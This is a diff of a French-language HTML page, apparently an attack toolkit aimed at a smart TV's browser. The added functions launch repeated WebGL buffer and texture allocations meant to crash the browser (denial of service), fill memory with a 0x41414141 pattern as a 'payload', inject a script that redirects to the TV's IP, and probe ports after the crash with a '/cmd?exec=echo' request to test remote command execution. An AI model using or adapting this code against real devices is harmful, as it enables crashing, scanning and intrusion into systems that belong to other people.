@@ -6,8 +6,9 @@
     <style>
         body { font-family: Arial, sans-serif; margin: 20px; background-color: white; }
         button { margin: 5px; padding: 10px; cursor: pointer; }
-        button.normal { background-color: #4CAF50; color: white; }
-        button.red { background-color: #f44336; color: white; }
+        button.normal { background-color: #4CAF50; color: white; } /* Tests originaux */
+        button.red { background-color: #f44336; color: white; } /* Tests DoS */
+        button.purple { background-color: #9C27B0; color: white; } /* Nouveaux exploits escalade */
         #status { color: black; }
     </style>
 </head>
@@ -26,10 +27,20 @@
     <button class="normal" onclick="testDRMPlugin()">Test DRM Plugin</button>
     <button class="normal" onclick="testWebGLShaderInjection()">Test WebGL Shader Injection</button>
 
-    <!-- Tests supplémentaires (boutons rouges) -->
+    <!-- Tests DoS (boutons rouges) -->
     <button class="red" onclick="testWebGLXSSCombo()">Test WebGL + XSS</button>
     <button class="red" onclick="testWebGLTextureOverflow()">Test WebGL Texture Overflow</button>
     <button class="red" onclick="startDoS()">Lancer DoS WebGL</button>
+    <button class="red" onclick="startFastDoS()">Lancer DoS WebGL Rapide</button>
+    <button class="red" onclick="startBigDoS()">Lancer DoS WebGL Gros Buffer</button>
+    <button class="red" onclick="startTextureDoS()">Lancer DoS WebGL + Texture</button>
+
+    <!-- Nouveaux exploits escalade (boutons violets) -->
+    <button class="purple" onclick="testPreciseOverflow()">Test Overflow Précis</button>
+    <button class="purple" onclick="testInjectPayload()">Test Injection Payload</button>
+    <button class="purple" onclick="testWebGLXSSComboEscalade()">Test WebGL + XSS Escalade</button>
+    <button class="purple" onclick="testPortsPostCrash()">Test Ports Post-Crash</button>
+    <button class="purple" onclick="startComplexDoS()">Lancer DoS Complexe</button>
 
     <script>
         function updateStatus(message) {
@@ -170,7 +181,7 @@
             }
         }
 
-        // Test WebGL + XSS Combo
+        // Test WebGL + XSS
         function testWebGLXSSCombo() {
             try {
                 var canvas = document.createElement('canvas');
@@ -185,7 +196,7 @@
                     document.body.appendChild(script);
                     updateStatus('WebGL+XSS tenté (orange si réussi)');
                 } else {
-                    updateStatus('Erreur WebGL');
+                    updateStatus('Erreur WebGL+XSS');
                 }
             } catch (e) {
                 updateStatus('Erreur WebGL+XSS');
@@ -226,6 +237,178 @@
                 } catch (e) {
                     clearInterval(interval);
                     updateStatus('DoS terminé, navigateur instable');
+                }
+            }, 100);
+        }
+
+        // Test DoS WebGL Rapide
+        function startFastDoS() {
+            var interval = setInterval(() => {
+                try {
+                    var canvas = document.createElement('canvas');
+                    var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                    if (gl) {
+                        var buffer = gl.createBuffer();
+                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                        var data = new Float32Array(10000000);
+                        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                    }
+                } catch (e) {
+                    clearInterval(interval);
+                    updateStatus('DoS rapide terminé, navigateur instable');
+                }
+            }, 50);
+        }
+
+        // Test DoS WebGL Gros Buffer
+        function startBigDoS() {
+            var interval = setInterval(() => {
+                try {
+                    var canvas = document.createElement('canvas');
+                    var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                    if (gl) {
+                        var buffer = gl.createBuffer();
+                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                        var data = new Float32Array(20000000);
+                        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                    }
+                } catch (e) {
+                    clearInterval(interval);
+                    updateStatus('DoS gros buffer terminé, navigateur instable');
+                }
+            }, 100);
+        }
+
+        // Test DoS WebGL + Texture
+        function startTextureDoS() {
+            var interval = setInterval(() => {
+                try {
+                    var canvas = document.createElement('canvas');
+                    var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                    if (gl) {
+                        var buffer = gl.createBuffer();
+                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                        var data = new Float32Array(10000000);
+                        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                        var texture = gl.createTexture();
+                        gl.bindTexture(gl.TEXTURE_2D, texture);
+                        var texData = new Uint8Array(10000000);
+                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 10000, 10000, 0, gl.RGBA, gl.UNSIGNED_BYTE, texData);
+                    }
+                } catch (e) {
+                    clearInterval(interval);
+                    updateStatus('DoS texture terminé, navigateur instable');
+                }
+            }, 100);
+        }
+
+        // Test Overflow Précis
+        function testPreciseOverflow() {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                if (gl) {
+                    var buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    var sizes = [9000000, 9500000, 10000000, 10500000];
+                    for (var size of sizes) {
+                        var data = new Float32Array(size);
+                        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                    }
+                    updateStatus('Overflow précis tenté (crash à une taille spécifique)');
+                } else {
+                    updateStatus('Erreur WebGL');
+                }
+            } catch (e) {
+                updateStatus('Erreur à taille ' + size);
+            }
+        }
+
+        // Test Injection Payload
+        function testInjectPayload() {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                if (gl) {
+                    var buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    var payload = new Float32Array(10000000);
+                    for (var i = 0; i < payload.length; i++) {
+                        payload[i] = 0x41414141; // Motif 'AAAA'
+                    }
+                    gl.bufferData(gl.ARRAY_BUFFER, payload, gl.STATIC_DRAW);
+                    updateStatus('Payload injecté, crash si exécution');
+                } else {
+                    updateStatus('Erreur WebGL');
+                }
+            } catch (e) {
+                updateStatus('Erreur Payload');
+            }
+        }
+
+        // Test WebGL + XSS Escalade
+        function testWebGLXSSComboEscalade() {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                if (gl) {
+                    var buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    var data = new Float32Array(10000000);
+                    gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                    var script = document.createElement('script');
+                    script.text = 'document.body.style.backgroundColor="orange"; if (window.someFlag) window.location="http://<IP_de_la_TV>:80/"';
+                    document.body.appendChild(script);
+                    updateStatus('WebGL+XSS tenté (orange + redirection si vulnérable)');
+                } else {
+                    updateStatus('Erreur WebGL+XSS');
+                }
+            } catch (e) {
+                updateStatus('Erreur WebGL+XSS');
+            }
+        }
+
+        // Test Ports Post-Crash
+        function testPortsPostCrash() {
+            try {
+                var ports = [80, 443, 8080, 1935, 554, 5000, 3000];
+                var ip = '<IP_de_la_TV>'; // Remplace par l'IP réelle
+                var postCrashResults = [];
+                ports.forEach(port => {
+                    var img = new Image();
+                    img.onload = () => {
+                        postCrashResults.push(`Port ${port}: Réponse post-crash`);
+                        var cmdImg = new Image();
+                        cmdImg.src = `http://${ip}:${port}/cmd?exec=echo`;
+                    };
+                    img.onerror = () => postCrashResults.push(`Port ${port}: Pas de réponse`);
+                    img.src = `http://${ip}:${port}/postcrash`;
+                });
+                setTimeout(() => updateStatus(`Post-crash: ${postCrashResults.length} ports répondent`), 3000);
+            } catch (e) {
+                updateStatus('Erreur ports post-crash');
+            }
+        }
+
+        // Test DoS Complexe
+        function startComplexDoS() {
+            var interval = setInterval(() => {
+                try {
+                    var canvas = document.createElement('canvas');
+                    var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                    if (gl) {
+                        var buffer = gl.createBuffer();
+                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                        var bufData = new Float32Array(10000000);
+                        gl.bufferData(gl.ARRAY_BUFFER, bufData, gl.STATIC_DRAW);
+                        var texture = gl.createTexture();
+                        gl.bindTexture(gl.TEXTURE_2D, texture);
+                        var texData = new Uint8Array(10000000);
+                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 10000, 10000, 0, gl.RGBA, gl.UNSIGNED_BYTE, texData);
+                    }
+                } catch (e) {
+                    clearInterval(interval);
+                    updateStatus('DoS complexe terminé, escalade possible');
                 }
             }, 100);
         }
